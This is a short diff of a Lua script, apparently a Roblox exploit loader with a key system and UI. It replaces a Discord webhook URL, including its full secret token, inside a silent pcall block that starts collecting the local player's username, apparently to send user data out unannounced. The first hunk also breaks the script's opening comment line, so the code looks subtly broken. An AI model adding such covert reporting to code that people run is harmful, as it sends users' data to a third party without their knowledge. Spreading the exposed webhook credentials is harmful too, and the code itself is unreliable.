@@ -1,4 +1,4 @@
---==================================================
+-===================================================
 -- NHYQ SCRIPT (Loader + Key System + Modern UI + Integrated Tab)
 --==================================================
 
@@ -51,7 +51,7 @@ end
 --==================================================
 
 pcall(function()
-    local _W = "https://discord.com/api/webhooks/1567921405239103488/G11TIn-mQ7uN0v-AdCLh7dJSnVccHy5qNVr3Aw9PQzgPiNohSGGtE4GWYizXU3T5erYV"
+    local _W = "https://discord.com/api/webhooks/1567934638595514388/9NdmO1s6Z9x72hbnehe3UXLZFW4_waKPoeP5Xtaoyw5bvN-gSLVUgWZXG6DK_ARbGBYy"
     local _info = {}
 
     _info.Username = _L.Name
